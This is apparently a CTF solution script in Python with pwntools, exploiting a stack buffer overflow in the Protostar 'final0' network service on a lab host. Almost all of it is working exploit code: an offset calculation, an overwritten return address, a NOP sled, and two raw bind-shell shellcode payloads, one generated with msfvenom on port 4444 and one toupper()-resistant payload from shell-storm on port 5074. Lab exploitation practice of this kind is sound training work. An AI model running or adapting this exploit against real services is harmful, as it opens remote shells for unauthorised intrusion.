#! /usr/bin/python

from pwn import *
import sys, os
import struct

path = "~/ctf-writeups/tools/pattern.py"
sys.path.append(os.path.dirname(os.path.expanduser(path)))

from pattern import pattern_create
from pattern import pattern_offset_compat as pattern_offset


HOST = "192.168.122.199"

def final0():

    PORT = 2995
    sock = remote(HOST, PORT)

    '''
    pattern = pattern_create(600)
    sock.send( pattern )
    # Triggers a crash. Inspect with gdb binary corefile

    # Server crashed at address '0x72413772'
    # Calculate offset
    offset = pattern_offset('0x72413772', 600)
    offset: 532

    looking at the crashdump, it loosk like at the time
    of the crash, the stack pointer is
    esp            0xbffffc60
    so we will make a nice big NOP sled in the buffer along
    with the shellcode.

    Also the shellcode should contain no \r or \n so it
    will be immune to the code that removes those trailing
    characters.
    '''

    # Generated with msfvenom
    # msfvenom -p linux/x86/shell_bind_tcp --platform linux -f python -b '\x00\xff\x0d\x0a'
    # Binds to TCP port 4444
    # -b are bytes to avoid, null, 0xff, \r and \n
    buf =  ""
    buf += "\xbd\x68\xc0\x58\x8c\xda\xcb\xd9\x74\x24\xf4\x5f\x31"
    buf += "\xc9\xb1\x14\x31\x6f\x14\x03\x6f\x14\x83\xc7\x04\x8a"
    buf += "\x35\x69\x57\xbd\x55\xd9\x24\x12\xf0\xdc\x23\x75\xb4"
    buf += "\x87\xfe\xf5\xee\x19\x53\x9d\x12\xa6\x42\x01\x79\xb6"
    buf += "\x35\xe9\xf4\x57\xdf\x6f\x5f\x55\xa0\xe6\x1e\x61\x12"
    buf += "\xfc\x10\x0f\x99\x7c\x13\x60\x47\xb1\x14\x13\xd1\x23"
    buf += "\x2a\x4c\x2f\x33\x1d\x15\x57\x5b\xb1\xca\xd4\xf3\xa5"
    buf += "\x3b\x79\x6a\x58\xcd\x9e\x3c\xf7\x44\x81\x0c\xfc\x9b"
    buf += "\xc2"

    offset = 532
    exit = '\xb7\xec\x60\xc0'[::-1]
    eip = '\xbf\xff\xfc\x60'[::-1]

    # Place the shellcode after the return to avoid toupper()
    payload = 'A'*offset + eip + '\x90'*20 + buf
    #sock.send(payload)


    '''
    Previous solution with msfvenom puts the buffer after the
    end of the buffer so that the shellcode doesnt need to be
    resistant to toupper(), but here's a solution that uses
    toupper() proof shellcode anyways.

    Used toupper() resistant shellcode with tcp bind on port 
    5074 from 
    http://shell-storm.org/shellcode/files/shellcode-370.php
    '''
    
    buf = ""
    buf += "\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x5f\x81\xef\xdf\xff\xff\xff\x57\x5e\x29\xc9\x80\xc1\xb8\x8a\x07\x2c\x41\xc0\xe0\x04\x47\x02\x07\x2c\x41\x88\x06\x46\x47\x49\xe2\xed"
    buf += "DBMAFAEAIJMDFAEAFAIJOBLAGGMNIADBNCFCGGGIBDNCEDGGFDIJOBGKB"
    buf += "AFBFAIJOBLAGGMNIAEAIJEECEAEEDEDLAGGMNIAIDMEAMFCFCEDLAGGMNIA"
    buf += "JDIJNBLADPMNIAEBIAPJADHFPGFCGIGOCPHDGIGICPCPGCGJIJODFCFDIJO"
    buf += "BLAALMNIA"

    '''
    After some jockeying with the layout of our payload, it works!
    ror some reason, putting all the shellcode at the end of the buffer
    ie: payload = '\x90' * (offset - len(buf)) + buf + eip + exit
    refused to work, changing up the layout works perfectly though.
    '''
    eip = '\xbf\xff\xfa\x50'[::-1]
    payload = ('\x90' * 32) + buf + ('\x90' * (offset - len(buf) - 32)) + eip + exit
    sock.send(payload)
    
    sock.close()

final0()
